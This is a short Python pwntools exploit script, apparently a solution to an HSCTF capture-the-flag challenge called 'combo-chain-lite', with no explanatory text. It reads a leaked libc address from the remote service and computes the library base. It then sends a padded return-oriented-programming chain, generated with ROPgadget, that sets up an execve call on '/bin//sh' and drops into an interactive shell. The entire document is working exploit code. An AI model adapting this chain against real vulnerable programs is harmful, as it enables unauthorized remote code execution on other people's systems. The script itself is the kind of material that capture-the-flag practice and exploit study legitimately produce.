#!/usr/bin/env python2
# execve generated by ROPgadget
from pwn import *
from struct import pack

pad = "A"*16
#s = process('./combo-chain-lite')
s = remote('pwn.hsctf.com', 3131)
that = s.recv()[27:27+14]
print that
that = int(that, 16)
off_sys = 0x45390
base = that - off_sys
# Padding goes here
p = ''

p += pack('<Q', 0x0000000000001b92 + base) # pop rdx ; ret
p += pack('<Q', 0x00000000003c4080 + base) # @ .data
p += pack('<Q', 0x0000000000033544 + base) # pop rax ; ret
p += '/bin//sh'
p += pack('<Q', 0x000000000002e19c + base) # mov qword ptr [rdx], rax ; ret
p += pack('<Q', 0x0000000000001b92 + base) # pop rdx ; ret
p += pack('<Q', 0x00000000003c4088 + base) # @ .data + 8
p += pack('<Q', 0x000000000008b8c5 + base) # xor rax, rax ; ret
p += pack('<Q', 0x000000000002e19c + base) # mov qword ptr [rdx], rax ; ret
p += pack('<Q', 0x0000000000021102 + base) # pop rdi ; ret
p += pack('<Q', 0x00000000003c4080 + base) # @ .data
p += pack('<Q', 0x00000000000202e8 + base) # pop rsi ; ret
p += pack('<Q', 0x00000000003c4088 + base) # @ .data + 8
p += pack('<Q', 0x0000000000001b92 + base) # pop rdx ; ret
p += pack('<Q', 0x00000000003c4088 + base) # @ .data + 8
p += pack('<Q', 0x000000000008b8c5 + base) # xor rax, rax ; ret
p += pack('<Q', 0x00000000000abf40 + base) # add rax, 1 ; ret
p += pack('<Q', 0x00000000000abf40 + base) # add rax, 1 ; ret
p += pack('<Q', 0x00000000000abf40 + base) # add rax, 1 ; ret
p += pack('<Q', 0x00000000000abf40 + base) # add rax, 1 ; ret
p += pack('<Q', 0x00000000000abf40 + base) # add rax, 1 ; ret
p += pack('<Q', 0x00000000000abf40 + base) # add rax, 1 ; ret
p += pack('<Q', 0x00000000000abf40 + base) # add rax, 1 ; ret
p += pack('<Q', 0x00000000000abf40 + base) # add rax, 1 ; ret
p += pack('<Q', 0x00000000000abf40 + base) # add rax, 1 ; ret
p += pack('<Q', 0x00000000000abf40 + base) # add rax, 1 ; ret
p += pack('<Q', 0x00000000000abf40 + base) # add rax, 1 ; ret
p += pack('<Q', 0x00000000000abf40 + base) # add rax, 1 ; ret
p += pack('<Q', 0x00000000000abf40 + base) # add rax, 1 ; ret
p += pack('<Q', 0x00000000000abf40 + base) # add rax, 1 ; ret
p += pack('<Q', 0x00000000000abf40 + base) # add rax, 1 ; ret
p += pack('<Q', 0x00000000000abf40 + base) # add rax, 1 ; ret
p += pack('<Q', 0x00000000000abf40 + base) # add rax, 1 ; ret
p += pack('<Q', 0x00000000000abf40 + base) # add rax, 1 ; ret
p += pack('<Q', 0x00000000000abf40 + base) # add rax, 1 ; ret
p += pack('<Q', 0x00000000000abf40 + base) # add rax, 1 ; ret
p += pack('<Q', 0x00000000000abf40 + base) # add rax, 1 ; ret
p += pack('<Q', 0x00000000000abf40 + base) # add rax, 1 ; ret
p += pack('<Q', 0x00000000000abf40 + base) # add rax, 1 ; ret
p += pack('<Q', 0x00000000000abf40 + base) # add rax, 1 ; ret
p += pack('<Q', 0x00000000000abf40 + base) # add rax, 1 ; ret
p += pack('<Q', 0x00000000000abf40 + base) # add rax, 1 ; ret
p += pack('<Q', 0x00000000000abf40 + base) # add rax, 1 ; ret
p += pack('<Q', 0x00000000000abf40 + base) # add rax, 1 ; ret
p += pack('<Q', 0x00000000000abf40 + base) # add rax, 1 ; ret
p += pack('<Q', 0x00000000000abf40 + base) # add rax, 1 ; ret
p += pack('<Q', 0x00000000000abf40 + base) # add rax, 1 ; ret
p += pack('<Q', 0x00000000000abf40 + base) # add rax, 1 ; ret
p += pack('<Q', 0x00000000000abf40 + base) # add rax, 1 ; ret
p += pack('<Q', 0x00000000000abf40 + base) # add rax, 1 ; ret
p += pack('<Q', 0x00000000000abf40 + base) # add rax, 1 ; ret
p += pack('<Q', 0x00000000000abf40 + base) # add rax, 1 ; ret
p += pack('<Q', 0x00000000000abf40 + base) # add rax, 1 ; ret
p += pack('<Q', 0x00000000000abf40 + base) # add rax, 1 ; ret
p += pack('<Q', 0x00000000000abf40 + base) # add rax, 1 ; ret
p += pack('<Q', 0x00000000000abf40 + base) # add rax, 1 ; ret
p += pack('<Q', 0x00000000000abf40 + base) # add rax, 1 ; ret
p += pack('<Q', 0x00000000000abf40 + base) # add rax, 1 ; ret
p += pack('<Q', 0x00000000000abf40 + base) # add rax, 1 ; ret
p += pack('<Q', 0x00000000000abf40 + base) # add rax, 1 ; ret
p += pack('<Q', 0x00000000000abf40 + base) # add rax, 1 ; ret
p += pack('<Q', 0x00000000000abf40 + base) # add rax, 1 ; ret
p += pack('<Q', 0x00000000000abf40 + base) # add rax, 1 ; ret
p += pack('<Q', 0x00000000000abf40 + base) # add rax, 1 ; ret
p += pack('<Q', 0x00000000000abf40 + base) # add rax, 1 ; ret
p += pack('<Q', 0x00000000000abf40 + base) # add rax, 1 ; ret
p += pack('<Q', 0x00000000000abf40 + base) # add rax, 1 ; ret
p += pack('<Q', 0x00000000000abf40 + base) # add rax, 1 ; ret
p += pack('<Q', 0x00000000000abf40 + base) # add rax, 1 ; ret
p += pack('<Q', 0x00000000000abf40 + base) # add rax, 1 ; ret
p += pack('<Q', 0x00000000000abf40 + base) # add rax, 1 ; ret
p += pack('<Q', 0x00000000000abf40 + base) # add rax, 1 ; ret
p += pack('<Q', 0x00000000000abf40 + base) # add rax, 1 ; ret
p += pack('<Q', 0x00000000000abf40 + base) # add rax, 1 ; ret
p += pack('<Q', 0x00000000000abf40 + base) # add rax, 1 ; ret
p += pack('<Q', 0x00000000000bc375 + base) # syscall ; ret

payload = pad + p
s.send(payload)
s.interactive()
